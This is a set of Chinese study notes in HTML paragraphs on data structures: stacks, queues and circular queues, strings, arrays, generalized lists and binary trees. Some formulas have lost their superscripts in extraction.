<p>\u6d4f\u89c8\u5668\u5386\u53f2\u7eaa\u5f55\uff0cAndroid\u4e2d\u7684\u6700\u8fd1\u4efb\u52a1\uff0cActivity\u7684\u542f\u52a8\u6a21\u5f0f\uff0cCPU\u4e2d\u6808\u7684\u5b9e\u73b0\uff0cWord\u81ea\u52a8\u4fdd\u5b58\uff0c\u89e3\u6790\u8ba1\u7b97\u5f0f\uff0c\u89e3\u6790xml/json\u3002\u89e3\u6790XML\u65f6\uff0c\u9700\u8981\u6821\u9a8c\u8282\u70b9\u662f\u5426\u95ed\u5408\uff0c\u8282\u70b9\u95ed\u5408\u7684\u8bdd\uff0c\u6709\u5934\u5c3e\u7b26\u53f7\u76f8\u5bf9\u5e94\uff0c\u9047\u5230\u5934\u7b26\u53f7\u5c06\u5176\u653e\u5165\u6808\u4e2d\uff0c\u9047\u5230\u5c3e\u7b26\u53f7\u65f6\uff0c\u5f39\u51fa\u6808\u7684\u5185\u5bb9\uff0c\u770b\u662f\u5426\u6709\u4e0e\u4e4b\u5bf9\u5e94\u7684\u5934\u7b26\u53f7\uff0c\u6808\u7684\u7279\u6027\u521a\u597d\u7b26\u5408\u7b26\u53f7\u5339\u914d\u7684\u5c31\u8fd1\u539f\u5219\u3002</p> <p>\u4e0d\u662f\u6240\u6709\u7684\u9012\u5f52\u7a0b\u5e8f\u90fd\u9700\u8981\u6808\u6765\u4fdd\u62a4\u73b0\u573a\uff0c\u6bd4\u65b9\u8bf4\u6c42\u9636\u4e58\u7684\uff0c\u662f\u5355\u5411\u9012\u5f52\uff0c\u76f4\u63a5\u7528\u5faa\u73af\u53bb\u66ff\u4ee3\u4ece1\u4e58\u5230n\u5c31\u662f\u7ed3\u679c\u4e86\uff0c\u53e6\u5916\u4e00\u4e9b\u9700\u8981\u6808\u4fdd\u5b58\u7684\u4e5f\u53ef\u4ee5\u7528\u961f\u5217\u7b49\u6765\u66ff\u4ee3\u3002\u4e0d\u662f\u6240\u6709\u7684\u9012\u5f52\u8f6c\u5316\u4e3a\u975e\u9012\u5f52\u90fd\u8981\u7528\u5230\u6808\u3002\u8f6c\u5316\u4e3a\u975e\u9012\u5f52\u4e3b\u8981\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a\u5bf9\u4e8e\u5c3e\u9012\u5f52\u6216\u5355\u5411\u9012\u5f52\uff0c\u53ef\u4ee5\u7528\u5faa\u73af\u7ed3\u6784\u7b97\u6cd5\u4ee3\u66ff</p> <p>\u961f\u5217</p> <p>\u961f\u5217(Queue)\u4e5f\u662f\u4e00\u79cd\u8fd0\u7b97\u53d7\u9650\u7684\u7ebf\u6027\u8868\u3002\u5b83\u53ea\u5141\u8bb8\u5728\u8868\u7684\u4e00\u7aef\u8fdb\u884c\u63d2\u5165\uff0c\u800c\u5728\u53e6\u4e00\u7aef\u8fdb\u884c\u5220\u9664\u3002\u5141\u8bb8\u5220\u9664\u7684\u4e00\u7aef\u79f0\u4e3a\u961f\u5934(front)\uff0c\u5141\u8bb8\u63d2\u5165\u7684\u4e00\u7aef\u79f0\u4e3a\u961f\u5c3e(rear)\u3002\u5148\u8fdb\u5148\u51fa\u3002</p> <p>\u987a\u5e8f\u961f\u5217\uff1a\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784\u3002\u5f53\u5934\u5c3e\u6307\u9488\u76f8\u7b49\u65f6\u961f\u5217\u4e3a\u7a7a\u3002\u5728\u975e\u7a7a\u961f\u5217\u91cc\uff0c\u5934\u6307\u9488\u59cb\u7ec8\u6307\u5411\u961f\u5934\u524d\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u800c\u5c3e\u6307\u9488\u59cb\u7ec8\u6307\u5411\u961f\u5c3e\u5143\u7d20\u7684\u5b9e\u9645\u4f4d\u7f6e</p> <p>\u5faa\u73af\u961f\u5217\u3002\u5728\u5faa\u73af\u961f\u5217\u4e2d\u8fdb\u884c\u51fa\u961f\u3001\u5165\u961f\u64cd\u4f5c\u65f6\uff0c\u5934\u5c3e\u6307\u9488\u4ecd\u8981\u52a01\uff0c\u671d\u524d\u79fb\u52a8\u3002\u53ea\u4e0d\u8fc7\u5f53\u5934\u5c3e\u6307\u9488\u6307\u5411\u5411\u91cf\u4e0a\u754c\uff08MaxSize-1\uff09\u65f6\uff0c\u5176\u52a01\u64cd\u4f5c\u7684\u7ed3\u679c\u662f\u6307\u5411\u5411\u91cf\u7684\u4e0b\u754c0\u3002\u9664\u975e\u5411\u91cf\u7a7a\u95f4\u771f\u7684\u88ab\u961f\u5217\u5143\u7d20\u5168\u90e8\u5360\u7528\uff0c\u5426\u5219\u4e0d\u4f1a\u4e0a\u6ea2\u3002\u56e0\u6b64\uff0c\u9664\u4e00\u4e9b\u7b80\u5355\u7684\u5e94\u7528\u5916\uff0c\u771f\u6b63\u5b9e\u7528\u7684\u987a\u5e8f\u961f\u5217\u662f\u5faa\u73af\u961f\u5217\u3002\u6545\u961f\u7a7a\u548c\u961f\u6ee1\u65f6\u5934\u5c3e\u6307\u9488\u5747\u76f8\u7b49\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7front=rear\u6765\u5224\u65ad\u961f\u5217\u201c\u7a7a\u201d\u8fd8\u662f\u201c\u6ee1\u201d</p> <p>\u94fe\u961f\u5217\uff1a\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u3002\u9650\u5236\u4ec5\u5728\u8868\u5934\u5220\u9664\u548c\u8868\u5c3e\u63d2\u5165\u7684\u5355\u94fe\u8868\u3002\u663e\u7136\u4ec5\u6709\u5355\u94fe\u8868\u7684\u5934\u6307\u9488\u4e0d\u4fbf\u4e8e\u5728\u8868\u5c3e\u505a\u63d2\u5165\u64cd\u4f5c\uff0c\u4e3a\u6b64\u518d\u589e\u52a0\u4e00\u4e2a\u5c3e\u6307\u9488\uff0c\u6307\u5411\u94fe\u8868\u7684\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\u3002</p> <p>\u8bbe\u5c3e\u6307\u9488\u7684\u5faa\u73af\u94fe\u8868\u8868\u793a\u961f\u5217,\u5219\u5165\u961f\u548c\u51fa\u961f\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5747\u4e3aO(1)\u3002\u7528\u5faa\u73af\u94fe\u8868\u8868\u793a\u961f\u5217\uff0c\u5fc5\u5b9a\u6709\u94fe\u8868\u7684\u5934\u7ed3\u70b9\uff0c\u5165\u961f\u64cd\u4f5c\u5728\u94fe\u8868\u5c3e\u63d2\u5165\uff0c\u76f4\u63a5\u63d2\u5165\u5728\u5c3e\u6307\u9488\u6307\u5411\u7684\u8282\u70b9\u540e\u9762\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u662f\u5e38\u6570\u7ea7\u7684\uff1b\u51fa\u961f\u64cd\u4f5c\u5728\u94fe\u8868\u8868\u5934\u8fdb\u884c\uff0c\u4e5f\u5c31\u662f\u5220\u9664\u8868\u5934\u6307\u5411\u7684\u8282\u70b9\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e5f\u662f\u5e38\u6570\u7ea7\u7684\u3002</p> <p>\u961f\u7a7a\u6761\u4ef6\uff1arear = = front\uff0c\u4f46\u662f\u4e00\u822c\u9700\u8981\u5f15\u5165\u65b0\u7684\u6807\u8bb0\u6765\u8bf4\u660e\u6808\u6ee1\u8fd8\u662f\u6808\u7a7a\uff0c\u6bd4\u5982\u6bcf\u4e2a\u4f4d\u7f6e\u5e03\u5c14\u503c</p> <p>\u961f\u6ee1\u6761\u4ef6\uff1a(rear+1) % QueueSize = = front\uff0c\u5176\u4e2dQueueSize\u4e3a\u5faa\u73af\u961f\u5217\u7684\u6700\u5927\u957f\u5ea6</p> <p>\u8ba1\u7b97\u961f\u5217\u957f\u5ea6\uff1a\uff08rear-front+QueueSize\uff09% QueueSize</p> <p>\u5165\u961f\uff1a\uff08rear+1\uff09% QueueSize</p> <p>\u51fa\u961f\uff1a\uff08front+1\uff09% QueueSize</p> <p>\u5047\u8bbe\u4ee5\u6570\u7ec4A[N]\u4e3a\u5bb9\u91cf\u5b58\u653e\u5faa\u73af\u961f\u5217\u7684\u5143\u7d20,\u5176\u5934\u6307\u9488\u662ffront,\u5f53\u524d\u961f\u5217\u6709X\u4e2a\u5143\u7d20,\u5219\u961f\u5217\u7684\u5c3e\u6307\u9488\u503c\u4e3a(front+X mod N)</p> <p>\u4e32</p> <p>\u4e32(String)\u662f\u96f6\u4e2a\u6216\u591a\u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u6709\u9650\u5e8f\u5217\u3002\u957f\u5ea6\u4e3a\u96f6\u7684\u4e32\u79f0\u4e3a\u7a7a\u4e32(Empty String)\uff0c\u5b83\u4e0d\u5305\u542b\u4efb\u4f55\u5b57\u7b26\u3002\u901a\u5e38\u5c06\u4ec5\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u7a7a\u683c\u7ec4\u6210\u7684\u4e32\u79f0\u4e3a\u7a7a\u767d\u4e32(Blank String) \u6ce8\u610f\uff1a\u7a7a\u4e32\u548c\u7a7a\u767d\u4e32\u7684\u4e0d\u540c\uff0c\u4f8b\u5982\u201c  \u201d\u548c\u201c\u201d\u5206\u522b\u8868\u793a\u957f\u5ea6\u4e3a1\u7684\u7a7a\u767d\u4e32\u548c\u957f\u5ea6\u4e3a0\u7684\u7a7a\u4e32\u3002</p> <p>\u4e32\u7684\u8868\u793a\u548c\u5b9e\u73b0\uff1a</p> <p>\u5b9a\u957f\u987a\u5e8f\u5b58\u50a8\u8868\u793a\u3002\u9759\u6001\u5b58\u50a8\u5206\u914d\u7684\u987a\u5e8f\u8868\u3002</p> <p>\u5806\u5206\u914d\u5b58\u50a8\u8868\u793a\u3002\u5b58\u50a8\u7a7a\u95f4\u662f\u5728\u7a0b\u5e8f\u6267\u884c\u8fc7\u7a0b\u4e2d\u52a8\u6001\u5206\u914d\u800c\u5f97\u3002\u6240\u4ee5\u4e5f\u79f0\u4e3a\u52a8\u6001\u5b58\u50a8\u5206\u914d\u7684\u987a\u5e8f\u8868</p> <p>\u4e32\u7684\u94fe\u5f0f\u5b58\u50a8\u7ed3\u6784\u3002</p> <p>\u4e32\u5339\u914d\uff1a\u5c06\u4e3b\u4e32\u79f0\u4e3a\u76ee\u6807\u4e32\uff0c\u5b50\u4e32\u79f0\u4e4b\u4e3a\u6a21\u5f0f\u4e32\u3002\u86ee\u529b\u6cd5\u5339\u914d\u3002KMP\u7b97\u6cd5\u5339\u914d\u3002Boyer-Moore\u7b97\u6cd5\u5339\u914d\u3002</p> <p>\u6570\u7ec4\u548c\u5e7f\u4e49\u8868</p> <p>\u6570\u7ec4\u548c\u5e7f\u4e49\u8868\u53ef\u770b\u6210\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u7ebf\u6027\u8868\uff0c\u5176\u7279\u6b8a\u5728\u4e8e: \u8868\u4e2d\u7684\u5143\u7d20\u672c\u8eab\u4e5f\u662f\u4e00\u79cd\u7ebf\u6027\u8868\u3002\u5185\u5b58\u8fde\u7eed\u3002\u6839\u636e\u4e0b\u6807\u5728O(1)\u65f6\u95f4\u8bfb/\u5199\u4efb\u4f55\u5143\u7d20\u3002</p> <p>\u4e8c\u7ef4\u6570\u7ec4\uff0c\u591a\u7ef4\u6570\u7ec4\uff0c\u5e7f\u4e49\u8868\u3001\u6811\u3001\u56fe\u90fd\u5c5e\u4e8e\u975e\u7ebf\u6027\u7ed3\u6784</p> <p>\u6570\u7ec4</p> <p>\u6570\u7ec4\u7684\u987a\u5e8f\u5b58\u50a8\uff1a\u884c\u4f18\u5148\u987a\u5e8f\uff1b\u5217\u4f18\u5148\u987a\u5e8f\u3002\u6570\u7ec4\u4e2d\u7684\u4efb\u4e00\u5143\u7d20\u53ef\u4ee5\u5728\u76f8\u540c\u7684\u65f6\u95f4\u5185\u5b58\u53d6\uff0c\u5373\u987a\u5e8f\u5b58\u50a8\u7684\u6570\u7ec4\u662f\u4e00\u4e2a\u968f\u673a\u5b58\u53d6\u7ed3\u6784\u3002</p> <p>\u5173\u8054\u6570\u7ec4(Associative Array)\uff0c\u53c8\u79f0\u6620\u5c04\uff08Map\uff09\u3001\u5b57\u5178\uff08 Dictionary\uff09\u662f\u4e00\u4e2a\u62bd\u8c61\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5b83\u5305\u542b\u7740\u7c7b\u4f3c\u4e8e(\u952e\uff0c\u503c)\u7684\u6709\u5e8f\u5bf9\u3002 \u4e0d\u662f\u7ebf\u6027\u8868\u3002</p> <p>\u77e9\u9635\u7684\u538b\u7f29\uff1a</p> <p>\u5bf9\u79f0\u77e9\u9635\u3001\u4e09\u89d2\u77e9\u9635\uff1a\u76f4\u63a5\u5b58\u50a8\u77e9\u9635\u7684\u4e0a\u4e09\u89d2\u6216\u8005\u4e0b\u4e09\u89d2\u5143\u7d20\u3002\u6ce8\u610f\u533a\u5206i&gt;=j\u548ci</p> <p>\u5e7f\u4e49\u8868</p> <p>\u5e7f\u4e49\u8868\uff08Lists\uff0c\u53c8\u79f0\u5217\u8868\uff09\u662f\u7ebf\u6027\u8868\u7684\u63a8\u5e7f\u3002\u5e7f\u4e49\u8868\u662fn(n\u22650)\u4e2a\u5143\u7d20a1,a2,a3,\u2026,an\u7684\u6709\u9650\u5e8f\u5217\uff0c\u5176\u4e2dai\u6216\u8005\u662f\u539f\u5b50\u9879\uff0c\u6216\u8005\u662f\u4e00\u4e2a\u5e7f\u4e49\u8868\u3002\u82e5\u5e7f\u4e49\u8868LS\uff08n&gt;=1)\u975e\u7a7a\uff0c\u5219a1\u662fLS\u7684\u8868\u5934\uff0c\u5176\u4f59\u5143\u7d20\u7ec4\u6210\u7684\u8868(a2,\u2026an)\u79f0\u4e3aLS\u7684\u8868\u5c3e\u3002\u5e7f\u4e49\u8868\u7684\u5143\u7d20\u53ef\u4ee5\u662f\u5e7f\u4e49\u8868\uff0c\u4e5f\u53ef\u4ee5\u662f\u539f\u5b50\uff0c\u5e7f\u4e49\u8868\u7684\u5143\u7d20\u4e5f\u53ef\u4ee5\u4e3a\u7a7a\u3002\u8868\u5c3e\u662f\u6307\u9664\u53bb\u8868\u5934\u540e\u5269\u4e0b\u7684\u5143\u7d20\u7ec4\u6210\u7684\u8868\uff0c\u8868\u5934\u53ef\u4ee5\u4e3a\u8868\u6216\u5355\u5143\u7d20\u503c\u3002\u6240\u4ee5\u8868\u5c3e\u4e0d\u53ef\u4ee5\u662f\u5355\u4e2a\u5143\u7d20\u503c\u3002</p> <p>\u4f8b\u5b50\uff1a</p> <p>A=\uff08\uff09\u2014\u2014A\u662f\u4e00\u4e2a\u7a7a\u8868\uff0c\u5176\u957f\u5ea6\u4e3a\u96f6\u3002</p> <p>B=\uff08e\uff09\u2014\u2014\u8868B\u53ea\u6709\u4e00\u4e2a\u539f\u5b50e\uff0cB\u7684\u957f\u5ea6\u4e3a1\u3002</p> <p>C=\uff08a,(b,c,d))\u2014\u2014\u8868C\u7684\u957f\u5ea6\u4e3a2\uff0c\u4e24\u4e2a\u5143\u7d20\u5206\u522b\u4e3a\u539f\u5b50a\u548c\u5b50\u8868(b,c,d)\u3002</p> <p>D=\uff08A\uff0cB\uff0cC\uff09\u2014\u2014\u8868D\u7684\u957f\u5ea6\u4e3a3\uff0c\u4e09\u4e2a\u5143\u7d20\u90fd\u662f\u5e7f\u4e49 \u8868\u3002\u663e\u7136\uff0c\u5c06\u5b50\u8868\u7684\u503c\u4ee3\u5165\u540e\uff0c\u5219\u6709D=(( ),(e),(a,(b,c,d)))\u3002</p> <p>E=\uff08a,E\uff09\u2014\u2014\u8fd9\u662f\u4e00\u4e2a\u9012\u5f52\u7684\u8868\uff0c\u5b83\u7684\u957f\u5ea6\u4e3a2\uff0cE\u76f8\u5f53\u4e8e\u4e00\u4e2a\u65e0\u9650\u7684\u5e7f\u4e49\u8868E=(a,(a,(a,(a,\u2026)))).</p> <p>\u4e09\u4e2a\u7ed3\u8bba\uff1a</p> <p>\u5e7f\u4e49\u8868\u7684\u5143\u7d20\u53ef\u4ee5\u662f\u5b50\u8868\uff0c\u800c\u5b50\u8868\u7684\u5143\u7d20\u8fd8\u53ef\u4ee5\u662f\u5b50\u8868\u3002\u7531\u6b64\uff0c\u5e7f\u4e49\u8868\u662f\u4e00\u4e2a\u591a\u5c42\u6b21\u7684\u7ed3\u6784\uff0c\u53ef\u4ee5\u7528\u56fe\u5f62\u8c61\u5730\u8868\u793a</p> <p>\u5e7f\u4e49\u8868\u53ef\u4e3a\u5176\u5b83\u8868\u6240\u5171\u4eab\u3002\u4f8b\u5982\u5728\u4e0a\u8ff0\u4f8b4\u4e2d\uff0c\u5e7f\u4e49\u8868A\uff0cB\uff0cC\u4e3aD\u7684\u5b50\u8868\uff0c\u5219\u5728D\u4e2d\u53ef\u4ee5\u4e0d\u5fc5\u5217\u51fa\u5b50\u8868\u7684\u503c\uff0c\u800c\u662f\u901a\u8fc7\u5b50\u8868\u7684\u540d\u79f0\u6765\u5f15\u7528\u3002</p> <p>\u5e7f\u4e49\u8868\u7684\u9012\u5f52\u6027</p> <p>\u8003\u70b9\uff1a</p> <p>\u5e7f\u4e49\u8868\u662f0\u4e2a\u6216\u591a\u4e2a\u5355\u56e0\u7d20\u6216\u5b50\u8868\u7ec4\u6210\u7684\u6709\u9650\u5e8f\u5217\uff0c\u5e7f\u4e49\u8868\u53ef\u4ee5\u662f\u81ea\u8eab\u7684\u5b50\u8868\uff0c\u5e7f\u4e49\u8868\u7684\u957f\u5ea6n&gt;=0\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e3a\u7a7a\u8868\u3002\u5e7f\u4e49\u8868\u7684\u540c\u7ea7\u5143\u7d20(\u76f4\u5c5e\u4e8e\u540c\u4e00\u4e2a\u8868\u4e2d\u7684\u5404\u5143\u7d20)\u5177\u6709\u7ebf\u6027\u5173\u7cfb</p> <p>\u5e7f\u4e49\u8868\u7684\u8868\u5934\u4e3a\u7a7a\uff0c\u5e76\u4e0d\u4ee3\u8868\u8be5\u5e7f\u4e49\u8868\u4e3a\u7a7a\u8868\u3002\u5e7f\u4e49\u8868()\u548c(())\u4e0d\u540c\u3002\u524d\u8005\u662f\u957f\u5ea6\u4e3a0\u7684\u7a7a\u8868\uff0c\u5bf9\u5176\u4e0d\u80fd\u505a\u6c42\u8868\u5934\u548c\u8868\u5c3e\u7684\u8fd0\u7b97\uff1b\u800c\u540e\u8005\u662f\u957f\u5ea6\u4e3al\u7684\u975e\u7a7a\u8868(\u53ea\u4e0d\u8fc7\u8be5\u8868\u4e2d\u60df\u4e00\u7684\u4e00\u4e2a\u5143\u7d20\u662f\u7a7a\u8868)\uff0c\u5bf9\u5176\u53ef\u8fdb\u884c\u5206\u89e3\uff0c\u5f97\u5230\u7684\u8868\u5934\u548c\u8868\u5c3e\u5747\u662f\u7a7a\u8868()</p> <p>\u5df2\u77e5\u5e7f\u4e49\u8868LS\uff1d((a,b,c),(d,e,f)),\u8fd0\u7528head\u548ctail\u51fd\u6570\u53d6\u51faLS\u4e2d\u539f\u5b50e\u7684\u8fd0\u7b97\u662fhead(tail(head(tail(LS)))\u3002\u6839\u636e\u8868\u5934\u3001\u8868\u5c3e\u7684\u5b9a\u4e49\u53ef\u77e5\uff1a\u4efb\u4f55\u4e00\u4e2a\u975e\u7a7a\u5e7f\u4e49\u8868\u7684\u8868\u5934\u662f\u8868\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5b83\u53ef\u4ee5\u662f\u539f\u5b50\uff0c\u4e5f\u53ef\u4ee5\u662f\u5b50\u8868\uff0c\u800c\u5176\u8868\u5c3e\u5fc5\u5b9a\u662f\u5b50\u8868\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5e7f\u4e49\u8868\u7684head\u64cd\u4f5c\uff0c\u53d6\u51fa\u7684\u5143\u7d20\u662f\u4ec0\u4e48\uff0c\u90a3\u4e48\u7ed3\u679c\u5c31\u662f\u4ec0\u4e48\u3002\u4f46\u662ftail\u64cd\u4f5c\u53d6\u51fa\u7684\u5143\u7d20\u5916\u5fc5\u987b\u52a0\u4e00\u4e2a\u8868\u2014\u2014\u201c\uff08\uff09\u201c\u3002tail(LS)\uff1d((d,e,f))\uff1bhead(tail(LS))=(d,e,f)\uff1btail(head(tail(LS)))=(e,f)\uff1bhead(tail(head(tail(LS))))=e\u3002</p> <p>\u4e8c\u7ef4\u4ee5\u4e0a\u7684\u6570\u7ec4\u5176\u5b9e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5e7f\u4e49\u8868</p> <p>\u5728\uff08\u975e\u7a7a\uff09\u5e7f\u4e49\u8868\u4e2d\uff1a1\u3001\u8868\u5934head\u53ef\u4ee5\u662f\u539f\u5b50\u6216\u8005\u4e00\u4e2a\u8868 2\u3001\u8868\u5c3etail\u4e00\u5b9a\u662f\u4e00\u4e2a\u8868 3.\u5e7f\u4e49\u8868\u96be\u4ee5\u7528\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784 4.\u5e7f\u4e49\u8868\u53ef\u4ee5\u662f\u4e00\u4e2a\u591a\u5c42\u6b21\u7684\u7ed3\u6784</p> <p>\u6811\u548c\u4e8c\u53c9\u6811</p> <p>\u4e00\u79cd\u975e\u7ebf\u6027\u7ed3\u6784\u3002\u6811\u662f\u9012\u5f52\u7ed3\u6784\uff0c\u5728\u6811\u7684\u5b9a\u4e49\u4e2d\u53c8\u7528\u5230\u4e86\u6811\u7684\u6982\u5ff5\u3002</p> <p>\u57fa\u672c\u672f\u8bed\uff1a</p> <p>\u6811\u7ed3\u70b9\uff1a\u5305\u542b\u4e00\u4e2a\u6570\u636e\u5143\u7d20\u53ca\u82e5\u5e72\u6307\u5411\u5b50\u6811\u7684\u5206\u652f\uff1b</p> <p>\u5b69\u5b50\u7ed3\u70b9\uff1a\u7ed3\u70b9\u7684\u5b50\u6811\u7684\u6839\u79f0\u4e3a\u8be5\u7ed3\u70b9\u7684\u5b69\u5b50\uff1b</p> <p>\u53cc\u4eb2\u7ed3\u70b9\uff1aB\u7ed3\u70b9\u662fA\u7ed3\u70b9\u7684\u5b69\u5b50\uff0c\u5219A\u7ed3\u70b9\u662fB\u7ed3\u70b9\u7684\u53cc\u4eb2\uff1b</p> <p>\u5144\u5f1f\u7ed3\u70b9\uff1a\u540c\u4e00\u53cc\u4eb2\u7684\u5b69\u5b50\u7ed3\u70b9\uff1b</p> <p>\u5802\u5144\u7ed3\u70b9\uff1a\u540c\u4e00\u5c42\u4e0a\u7ed3\u70b9\uff1b</p> <p>\u7ed3\u70b9\u5c42\u6b21\uff1a\u6839\u7ed3\u70b9\u7684\u5c42\u5b9a\u4e49\u4e3a1\uff1b\u6839\u7684\u5b69\u5b50\u4e3a\u7b2c\u4e8c\u5c42\u7ed3\u70b9\uff0c\u4f9d\u6b64\u7c7b\u63a8\uff1b</p> <p>\u6811\u7684\u9ad8\uff08\u6df1\uff09\u5ea6\uff1a\u6811\u4e2d\u6700\u5927\u7684\u7ed3\u70b9\u5c42</p> <p>\u7ed3\u70b9\u7684\u5ea6\uff1a\u7ed3\u70b9\u5b50\u6811\u7684\u4e2a\u6570</p> <p>\u6811\u7684\u5ea6\uff1a \u6811\u4e2d\u6700\u5927\u7684\u7ed3\u70b9\u5ea6\u3002</p> <p>\u53f6\u5b50\u7ed3\u70b9\uff1a\u4e5f\u53eb\u7ec8\u7aef\u7ed3\u70b9\uff0c\u662f\u5ea6\u4e3a0\u7684\u7ed3\u70b9\uff1b</p> <p>\u5206\u679d\u7ed3\u70b9\uff1a\u5ea6\u4e0d\u4e3a0\u7684\u7ed3\u70b9\uff08\u975e\u7ec8\u7aef\u7ed3\u70b9\uff09\uff1b</p> <p>\u68ee\u6797\uff1a\u4e92\u4e0d\u76f8\u4ea4\u7684\u6811\u96c6\u5408\uff1b</p> <p>\u6709\u5e8f\u6811\uff1a\u5b50\u6811\u6709\u5e8f\u7684\u6811\uff0c\u5982\uff1a\u5bb6\u65cf\u6811\uff1b</p> <p>\u65e0\u5e8f\u6811\uff1a\u4e0d\u8003\u8651\u5b50\u6811\u7684\u987a\u5e8f\uff1b</p> <p>\u4e8c\u53c9\u6811</p> <p>\u4e8c\u53c9\u6811\u53ef\u4ee5\u4e3a\u7a7a\u3002\u4e8c\u53c9\u6811\u7ed3\u70b9\u7684\u5b50\u6811\u8981\u533a\u5206\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\uff0c\u5373\u4f7f\u53ea\u6709\u4e00\u68f5\u5b50\u6811\u4e5f\u8981\u8fdb\u884c\u533a\u5206\uff0c\u8bf4\u660e\u5b83\u662f\u5de6\u5b50\u6811\uff0c\u8fd8\u662f\u53f3\u5b50\u6811\u3002\u8fd9\u662f\u4e8c\u53c9\u6811\u4e0e\u6811\u7684\u6700\u4e3b\u8981\u7684\u5dee\u522b\u3002\u6ce8\u610f\u533a\u5206\uff1a\u4e8c\u53c9\u6811\u3001\u4e8c\u53c9\u67e5\u627e\u6811/\u4e8c\u53c9\u6392\u5e8f\u6811/\u4e8c\u53c9\u641c\u7d22\u6811\u3001\u4e8c\u53c9\u5e73\u8861(\u67e5\u627e)\u6811</p> <p>\u4e8c\u53c9\u5e73\u8861\u6811\u80af\u5b9a\u662f\u4e00\u9897\u4e8c\u53c9\u6392\u5e8f\u6811\u3002\u5806\u4e0d\u662f\u4e00\u9897\u4e8c\u53c9\u5e73\u8861\u6811\u3002</p> <p>\u4e8c\u53c9\u6811\u4e0e\u6811\u662f\u4e0d\u540c\u7684\uff0c\u4e8c\u53c9\u6811\u4e0d\u7b49\u4ef7\u4e8e\u5206\u652f\u6811\u6700\u591a\u4e3a\u4e8c\u7684\u6709\u5e8f\u6811\u3002\u5f53\u4e00\u4e2a\u7ed3\u70b9\u53ea\u5305\u542b\u4e00\u4e2a\u5b50\u8282\u70b9\u65f6\uff0c\u5bf9\u4e8e\u6709\u5e8f\u6811\u5e76\u65e0\u5de6\u53f3\u5b69\u5b50\u4e4b\u5206\uff0c\u800c\u5bf9\u4e8e\u4e8c\u53c9\u6811\u6765\u8bf4\u4f9d\u7136\u6709\u5de6\u53f3\u5b69\u5b50\u4e4b\u5206\uff0c\u6240\u4ee5\u4e8c\u53c9\u6811\u4e0e\u6811\u662f\u4e24\u79cd\u4e0d\u540c\u7684\u7ed3\u6784\u3002</p> <p>\u6027\u8d28\uff1a</p> <p>\u5728\u4e8c\u53c9\u6811\u7684\u7b2c i \u5c42\u4e0a\u81f3\u591a\u67092i-1\u4e2a\u7ed3\u70b9\u3002</p> <p>\u6df1\u5ea6\u4e3a k \u7684\u4e8c\u53c9\u6811\u4e0a\u81f3\u591a\u542b 2k-1 \u4e2a\u7ed3\u70b9\uff08k\u22651\uff09</p> <p>\u5bf9\u4efb\u4f55\u4e00\u68f5\u4e8c\u53c9\u6811\uff0c\u82e5\u5b83\u542b\u6709n0\u4e2a\u53f6\u5b50\u7ed3\u70b9\u3001n2\u4e2a\u5ea6\u4e3a 2 \u7684\u7ed3\u70b9\uff0c\u5219\u5fc5\u5b58\u5728\u5173\u7cfb\u5f0f\uff1an0= n2+1\u3002</p> <p>\u5177\u6709 n \u4e2a\u7ed3\u70b9\u7684\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u6df1\u5ea6\u4e3a\u23a3log2 n\u23a6+1 \u3002</p> <p>n\u4e2a\u7ed3\u70b9\u7684\u4e8c\u53c9\u6811\u4e2d\uff0c\u5b8c\u5168\u4e8c\u53c9\u6811\u5177\u6709\u6700\u5c0f\u7684\u8def\u5f84\u957f\u5ea6\u3002</p> <p>\u5982\u679c\u5bf9\u4e00\u68f5\u6709n\u4e2a\u7ed3\u70b9\u7684\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u7ed3\u70b9\u6309\u5c42\u5e8f\u7f16\u53f7,\u5219\u5bf9\u4efb\u4e00\u7ed3\u70b9i\uff081&lt;=i&lt;=n),\u6709\uff1a </p> <p>\u5982\u679ci\uff1d1\uff0c\u5219\u7ed3\u70b9i\u65e0\u53cc\u4eb2\uff0c\u662f\u4e8c\u53c9\u6811\u7684\u6839\uff1b\u5982\u679ci&gt;1\uff0c\u5219\u5176\u53cc\u4eb2\u7684\u7f16\u53f7\u662f i/2(\u6574\u9664\uff09\u3002</p> <p>\u5982\u679c2i&gt;n\uff0c\u65e0\u5de6\u5b69\u5b50\uff1b\u5426\u5219\uff0c\u5176\u5de6\u5b69\u5b50\u662f\u7ed3\u70b92i\u3002</p> <p>\u5982\u679c2i\uff0b1&gt;n\uff0c\u5219\u7ed3\u70b9i\u65e0\u53f3\u5b69\u5b50\uff1b\u5426\u5219\uff0c\u5176\u53f3\u5b69\u5b50\u662f\u7ed3\u70b92i\uff0b1\u3002</p> <p>\u4e8c\u53c9\u6811\u7684\u5b58\u50a8\u7ed3\u6784</p> <p>\u987a\u5e8f\u5b58\u50a8\u7ed3\u6784\uff1a\u4ec5\u4ec5\u9002\u7528\u4e8e\u6ee1\u6216\u5b8c\u5168\u4e8c\u53c9\u6811\uff0c\u7ed3\u70b9\u4e4b\u95f4\u7684\u5c42\u6b21\u5173\u7cfb\u7531\u6027\u8d285\u786e\u5b9a\u3002</p> <p>\u4e8c\u53c9\u94fe\u8868\u6cd5\uff1a\u6bcf\u4e2a\u8282\u70b9\u5b58\u50a8\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u3002\u4e09\u53c9\u94fe\u8868\uff1a\u5de6\u5b50\u6811\u3001\u53f3\u5b50\u6811\u3001\u7236\u8282\u70b9\uff0c\u603b\u7684\u6307\u9488\u662fn+2</p> 